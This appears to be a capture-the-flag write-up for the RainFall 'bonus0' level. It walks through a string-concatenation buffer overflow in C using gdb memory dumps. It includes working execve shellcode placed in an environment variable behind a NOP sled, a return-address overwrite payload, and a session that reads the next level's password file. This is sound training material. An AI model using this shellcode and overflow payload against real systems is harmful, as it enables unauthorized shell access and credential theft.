# Bonus 0

<h3>source.c</h3>

```console
void p(char* str, char* seperator) {
  char buffer[4096];

  puts(seperator);
  read(0, buffer, 4096);
  strchr(buffer, '\n')[0] = 0;
  strncpy(str, buffer, 20);
}

void pp(char *str) {
  char a[20];
  char b[20];

  p(a, " - ");
  p(b, " - ");
  strcpy(str, a);
  str[strlen(str)] = ' ';
  strcat(str, b);
}

int main(void) {
  char str[42];

  pp(str);
  puts(str);
  return (0);
}
```

<h3>Analysis</h3>

In this program, there is 2 vulnerable function, `strcpy` and `strcat`, but it seems that the buffer is quite small, and there is some writing protecting in `p()` as well.

```console
inside p()
read(0, buffer, 4096);              -> read from buffer
strchr(buffer, '\n')[0] = 0;        -> assign `0` as null termination for string
strncpy(str, buffer, 20);           -> copy only 20 bytes into the str given as arg to p()
```

With gdb we can find the address for these following variable

```console
char* a                 -> `0xbffff628`
char* b                 -> `0xbffff63c`
char* str [esp+0x16]    -> `0xbffff676`
```

Lets make some breakpoint and see what happen in some of these interesting part of the code

```console
(gdb) break *0x08048539 -> after 1st p()
(gdb) break *0x0804854c -> after 2nd p()
(gdb) break *0x0804855e -> after strcpy
(gdb) break *0x0804859d -> after strcat
```

Okay, the preparation is completed, lets check how much buffer we actually have, and what kind of exploit we could do

```console
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 8, 0x08048539 in pp ()
(gdb) x/32wx $esp
0xbffff600:	0xbffff628	0x080486a0	0x00000000	0xb7fd0ff4
0xbffff610:	0xbffff65e	0xbffff65f	0x00000001	0xb7ec3c49
0xbffff620:	0xbffff65f	0xbffff65e	0x61616161	0x61616161      -> the address of str 'a' have being writen by 20 * 'a' char,
0xbffff630:	0x61616161	0x61616161	0x61616161	0xb7e5ec73         the '0' which is suppose to be terminating the string is overwriten by 'a' as well,
0xbffff640:	0x0804829c	0x00000000	0x00c30000	0x00000001         thus this str does not terminate
0xbffff650:	0xb7fd0ff4	0x00000000	0xbffff6a8	0x080485b9
```

```console
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

Breakpoint 9, 0x0804854c in pp ()
(gdb) x/32wx $esp
0xbffff600:	0xbffff63c	0x080486a0	0x00000000	0xb7fd0ff4
0xbffff610:	0xbffff65e	0xbffff65f	0x00000001	0xb7ec3c49
0xbffff620:	0xbffff65f	0xbffff65e	0x61616161	0x61616161
0xbffff630:	0x61616161	0x61616161	0x61616161	0x62626262      -> the address of str 'b' located just after str 'a', and we can clearly see that there is no '0'
0xbffff640:	0x62626262	0x62626262	0x62626262	0x62626262         the '0' for str 'b' have being overwritten as well
0xbffff650:	0xb7fd0ff4	0x00000000	0xbffff6a8	0x080485b9
0xbffff660:	0xbffff676	0x080498d8	0x00000002	0x0804835d
0xbffff670:	0xb7fd13e4	0x00000016	0x080498d8	0x080485f1
```

Base on the example above, if we write 20 char for both str 'a' and str 'b', they will both ends up of having no '0' (null termination) and the final content for both of them will looks like this

```console
char* a
0xbffff628:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff638:	0x61616161	0x62626262	0x62626262	0x62626262
0xbffff648:	0x62626262	0x62626262	0xb7fd0ff4	0x00000000

char* b
0xbffff63c:	0x62626262	0x62626262	0x62626262	0x62626262
0xbffff64c:	0x62626262	0xb7fd0ff4	0x00000000
```

So when this `strcpy(str, a)` happen, the character written into str will be `'a' * 20 + 'b' * 20 + '0xb7fd0ff4'`

```console
(gdb) x/32w 0xbffff676
0xbffff676:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff686:	0x61616161	0x62626262	0x62626262	0x62626262
0xbffff696:	0x62626262	0x62626262	0xb7fd0ff4	0x00000800
```

Next the str will be added with a `0x20(white_space)` and continue with `strcat(str, b)`, which will concat `'b' * 20 + '0xb7fd0ff4'` into str

```console
(gdb) x/32w 0xbffff676
0xbffff676:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff686:	0x61616161	0x62626262	0x62626262	0x62626262
0xbffff696:	0x62626262	0x62626262	0xb7fd0ff4	0x62626220
0xbffff6a6:	0x62626262	0x62626262	0x62626262	0x62626262
0xbffff6b6:	0xfd0ff462	0xc85800b7
```

Base on this, the char *str which is supposed to only have 42 buffer, and each str a and str b are only suppose to be writing 21 max, are now ended up writing 72 bytes in total!

The `RET` of the main function is location at `0xbffff6ac`, [str + 0x36]

and base on the experiment, an offset of `9` for char* b is enough to reach it.

But since there is only `11` char left for us to play around in `char* b`, it is not enough to call `shellcode` or even `system(/bin/sh)` (we only need 12 bytes for that, oh god..)

<h3>Exploit</h3>

Because of the limitation of the usable buffer, we could not use `ret2libc` attack, also there is `ASLR (Address space layout randomization)` which will change the stack address everytime the program rerun

This making the exploit even harder as it will be close to imposible to pinpoint the correct address

What we could do here is to use ENV to store our shell code, also we can add u bunch of `NOP (\x90)` or `No operation` in front of our `ShellCode`

So that even if the location that we jump into are not exectly the start of the `ShellCode`, `NOP` will help us slide into it as it will perform no operation and move the `EIP` forward

And eventually, we could reach our `ShellCode` (NOP slide FTW!!)

```console
export SHELLCODE=`python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
```

Next, what we need to do is to find the address of our `ENV SHELLCODE`

```console
(gdb) break *0x080485c0
Breakpoint ` at 0x80485c0
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
aa
 -
bb

Breakpoint `, 0x080485c0 in main ()
(gdb) x/s *((char **)environ)
0xbffff841:
"SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211\302\260\v\315\200\061\300@\315\200"
(gdb) x/32wx 0xbffff841
0xbffff841:	0x4c454853	0x444f434c	0x90903d45	0x90909090
0xbffff851:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff861:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff871:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff881:	0x90909090	0x90909090	0x90909090	0x90909090
```

From there we can choose any address that contain the `\x90`, and the `NOP slide` will bring us to the beginning of our `ShellCode`, example `0xbffff851`

Now its time to build our payload

```console
python -c "print 'a' * 4095 + '\n' + 'b' * 9 + '\x51\xf8\xff\xbf' + 'b' * 7" > /tmp/a
```

I have tried to fill the first buffer with only 20 bytes but its not working, so finally i put the max buffer for the first read and it works!

```console
bonus0@RainFall:~$ python -c "print 'a' * 4095 + '\n' + 'b' * 9 + '\x51\xf8\xff\xbf' + 'b' * 7" > /tmp/a
bonus0@RainFall:~$ cat /tmp/a - | ./bonus0
 -
 -
aaaaaaaaaaaaaaaaaaaabbbbbbbbbQ���bbbbbbb�� bbbbbbbbbQ���bbbbbbb��
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```